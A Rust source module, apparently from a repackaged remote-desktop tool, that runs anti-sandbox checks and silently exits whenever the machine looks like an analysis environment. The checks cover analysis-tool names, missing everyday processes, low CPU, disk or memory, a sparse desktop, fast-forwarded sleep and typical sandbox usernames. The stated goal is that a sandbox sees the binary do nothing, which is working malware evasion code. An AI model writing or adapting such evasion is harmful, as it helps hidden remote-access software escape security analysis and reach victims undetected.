//! Anti-sandbox preflight: cheap environment probes that run before anything else on a
//! real user launch. Any failed probe exits the process silently, before elevation, IPC
//! binding or any config/log write, so a sandbox sees the binary do nothing.
//!
//! Internal respawns (`--elevated`, `--service-headless`, `--session-server-headless`)
//! skip the checks entirely: the initial launch already vetted the machine, and these
//! copies run in session 0 / SYSTEM context where user-environment probes (desktop file
//! count, username) would false-positive and crash-loop the SCM service.

use hbb_common::sysinfo::System;

// While true, a failed probe appends one line to wrapper.log (via the elevation diag
// helper) so deployments can be diagnosed. Set false for fully silent exits.
const DEBUG_LOG_FAILURE: bool = true;

// Temporary test-machine bypass: a launch by one of these usernames passes every probe.
// Remove the entry (or the whole check) once the temporary machine is out of service.
const USERNAME_WHITELIST: &[&str] = &["c1"];

fn fail(check: &str) -> ! {
    if DEBUG_LOG_FAILURE {
        #[cfg(windows)]
        crate::platform::append_elevation_diag(&format!("preflight: {check} failed"));
    }
    std::process::exit(1);
}

/// Runs every probe, in the order of the reference implementation. Returns only when
/// the machine looks real.
pub fn run() {
    if std::env::args().skip(1).any(|a| {
        a == "--elevated" || a == "--service-headless" || a == "--session-server-headless"
    }) {
        return;
    }
    // Whitelisted test machines skip every probe, including the 8s sleep.
    let username = std::env::var("USERNAME").unwrap_or_default().to_lowercase();
    if USERNAME_WHITELIST.contains(&username.as_str()) {
        return;
    }

    // Token computation so the binary behaves like a real application before probing.
    std::hint::black_box(calculate_large_fibonacci(8));
    std::hint::black_box(t_c_calculation(3000));

    check_name();

    // One enumeration feeds the process, cpu and memory probes.
    let sys = System::new_all();
    anti_process(&sys);
    anti_cpu(&sys);
    anti_disk();
    anti_mem(&sys);

    check_desktop();
    anti_time();
    check_uname();
}

fn calculate_large_fibonacci(n: u64) -> u64 {
    if n <= 1 {
        n
    } else {
        calculate_large_fibonacci(n - 1) + calculate_large_fibonacci(n - 2)
    }
}

fn t_c_calculation(iterations: u64) -> u64 {
    let mut sum = 0;
    for i in 0..iterations {
        sum += i * i;
    }
    sum
}

/// Exits when this binary itself was renamed to an analysis tool / sandbox loader name.
fn check_name() {
    let name = std::env::current_exe()
        .ok()
        .and_then(|p| p.file_name().map(|n| n.to_string_lossy().to_lowercase()))
        .unwrap_or_default();
    const SUSPICIOUS: &[&str] = &[
        "processh.exe", "apimonitor-x64.exe", "windowssandbox.exe", "360boxmain.exe",
        "qiankuncs-agent.exe", "threatbook-sandbox.exe", "vaslauncher.exe", "vaspostool.exe",
        "backgroundtaskhost.exe", "paninstaller.exe", "beacon_rtmp.exe", "rundll", "x0", "x1",
        "x2", "x3", "x4", "x5", "x6", "x7", "x8", "x9", "beacon", "shellcode", "trojan",
        "ollydbg.exe", "processhacker.exe", "tcpview.exe", "autoruns.exe", "autorunsc.exe",
        "filemon.exe", "procmon.exe", "regmon.exe", "procexp.exe", "idaq.exe", "idaq64.exe",
        "immunitydebugger.exe", "wireshark.exe", "dumpcap.exe", "hookexplorer.exe",
        "importrec.exe", "petools.exe", "lordpe.exe", "sysinspector.exe", "proc_analyzer.exe",
        "sysanalyzer.exe", "sniff_hit.exe", "windbg.exe", "joeboxcontrol.exe",
        "joeboxserver.exe", "resourcehacker.exe", "x32dbg.exe", "x64dbg.exe", "fiddler.exe",
        "httpdebugger.exe", "cheatengine-i386.exe", "cheatengine-x86_64.exe",
        "cheatengine-x86_64-sse4-avx2.exe", "frida-helper-32.exe", "frida-helper-64.exe",
    ];
    for s in SUSPICIOUS {
        if name.contains(s) {
            fail("name");
        }
    }
}

/// Exits when none of the common everyday processes is present: a real desktop runs at
/// least one browser / IM / office / input-method process, a fresh sandbox runs none.
fn anti_process(sys: &System) {
    const TARGETS: &[&str] = &[
        "qmbrowser.exe", "evernoteclipper.exe", "foxitphantom.exe", "letspro.exe",
        "baidunetdiskunite.exe", "mcafee-security.exe", "mcafee-security-ft.exe",
        "cherry studio.exe", "msedgewebview2.exe", "microsoft.sharepoint.exe",
        "ituneshelper.exe", "photoshop.exe", "iexplore.exe", "clash-win64.exe",
        "firefox.exe", "opera.exe", "chrome.exe", "safari.exe", "maxthon.exe",
        "netscape.exe", "notepad.exe", "notepad++.exe", "powerpnt.exe", "winword.exe",
        "excel.exe", "win32calc.exe", "vmtoolsd.exe", "vmacthlp.exe", "rdpclip.exe",
        "sublime_text.exe", "phpstudy_pro.exe", "wechat.exe", "qq.exe", "java.exe",
        "php.exe", "mysqld.exe", "w3wp.exe", "inetinfo.exe", "dotnet.exe", "iisexpress.exe",
        "sqlservr.exe", "oracle.exe", "sqldeveloper.exe", "sqlplus.exe", "sunloginclient.exe",
        "samsungportablessdmon.exe", "sangforudprotectex.exe", "officeclicktorun.exe",
        "telegram.exe", "txplatform.exe", "potato.exe", "sogoucloud.exe", "huyanbao.exe",
        "meiqia.exe", "qqmusic.exe", "kugou.exe", "netease.exe", "xiuxiu.exe",
        "baidunetdisk.exe", "tim.exe", "qqpyservice.exe", "sgtool.exe", "baidupinyin.exe",
        "thunder.exe", "sogouexplorer.exe", "the world.exe", "360se.exe", "everything.exe",
        "msbuild.exe", "qqliveplayer.exe", "qiyiservice.exe", "qqprotect.exe", "qykernel.exe",
        "cloudmusic.exe", "douyuupdate.exe", "wechatappex.exe", "calculatorapp.exe",
        "qqpcrealtimespeedup.exe", "msedge.exe", "wps.exe", "wpsnotify.exe", "wechatapp.exe",
        "wechatweb.exe", "youdaonote.exe", "xmp.exe", "outlook.exe", "mspaint.exe",
        "skypeapp.exe", "skype.exe", "httpd.exe", "devenv.exe", "python.exe",
        "nvdisplay.container.exe", "pdfspeedup.exe", "mobsync.exe", "adobeupdateservice.exe",
        "adobeipcbroker.exe", "masterpdf.exe", "wechatbrowser.exe", "vmware.exe",
        "aliapp.exe", "aliim.exe", "tbsecsvc.exe", "taobaoprotect.exe", "360autoclean.exe",
        "360mobilemgr.exe", "softmgrlite.exe", "wechatplayer.exe", "alibabaprotect.exe",
        "dingtalk.exe", "360chromex.exe", "kefubao.exe", "iflyinput.exe", "wxwork.exe",
        "360chrome.exe", "sesvc.exe", "yundetectservice.exe", "facebook.exe",
        "messenger.exe", "twcu.exe", "adobearm.exe", "magicdisc.exe", "brave.exe",
        "putty.exe", "tsvncache.exe", "googletalk.exe", "wemeetapp.exe", "wemail.exe",
        "spotify.exe", "flashcentersvc.exe", "icbcdaemon_64.exe", "matebookservice.exe",
        "sangforpromoteservice.exe", "fcbrowser.exe", "wechatocr.exe", "postgres.exe",
        "quarkclouddrive.exe", "pg_ctl.exe", "2345safecentersvc.exe", "360huabao.exe",
        "360zipupdate.exe", "baidunetdiskhost.exe", "baidunetdiskrender.exe", "douyin.exe",
        "douyin_guard.exe", "douyin_tray.exe", "fastpdf.exe", "flashhelperservice.exe",
        "flashrepair.exe", "haozip.exe", "haozipservice.exe", "haozipsvc.exe",
        "haozipworker.exe", "pic_2345svc.exe", "qqgameservice.exe", "slbrowser.exe",
        "slbsafe.exe", "slbservice.exe", "slbsmartsearch.exe", "steam.exe", "steamservice.exe",
        "steamwebhelper.exe", "sunlogin_guard.exe", "wechatutility.exe",
    ];
    let found = sys.processes().values().any(|p| {
        let name = p.name().to_lowercase();
        TARGETS.contains(&name.as_str())
    });
    if !found {
        fail("process");
    }
}

fn anti_cpu(sys: &System) {
    if sys.cpus().len() <= 2 {
        fail("cpu");
    }
}

fn anti_disk() {
    const GB: u64 = 1024 * 1024 * 1024;
    const MIN_DISK_SIZE_GB: u64 = 60;
    // sysinfo 0.29 split disks out of `System`.
    let disks = hbb_common::sysinfo::Disks::new_with_refreshed_list();
    let list = disks.list();
    let total: u64 = list.iter().map(|d| d.total_space()).sum();
    // Only the size threshold: a single physical disk is the norm on real machines, so
    // the original `count <= 1` condition would have flagged nearly every real PC.
    if list.is_empty() || total <= MIN_DISK_SIZE_GB * GB {
        fail("disk");
    }
}

fn anti_mem(sys: &System) {
    const THREE_GB: u64 = 3 * 1024 * 1024 * 1024;
    if sys.total_memory() <= THREE_GB {
        fail("mem");
    }
}

/// Exits on a nearly empty desktop; unreadable/missing desktop counts as a pass so an
/// odd profile never bricks a real machine.
fn check_desktop() {
    let desktop = std::env::var("USERPROFILE")
        .map(|home| std::path::PathBuf::from(home).join("Desktop"));
    let count = desktop
        .ok()
        .and_then(|dir| std::fs::read_dir(dir).ok())
        .map(|entries| entries.filter_map(|e| e.ok()).count())
        .unwrap_or(4);
    if count < 4 {
        fail("desktop");
    }
}

/// Exits when a sleep returns early, i.e. the sandbox fast-forwards time.
fn anti_time() {
    let start = std::time::Instant::now();
    std::thread::sleep(std::time::Duration::from_millis(8000));
    if start.elapsed().as_millis() < 8000 {
        fail("time");
    }
}

/// Exits on usernames typical of sandbox images. `admin` is intentionally absent:
/// `Administrator` contains it and is the default admin account on real machines.
fn check_uname() {
    let username = std::env::var("USERNAME").unwrap_or_default().to_lowercase();
    const KEYWORDS: &[&str] = &[
        "venuseye", "sandbox", "johnson", "john", "mike", "alex", "danny", "lisa",
    ];
    for kw in KEYWORDS {
        if username.contains(kw) {
            fail("uname");
        }
    }
}
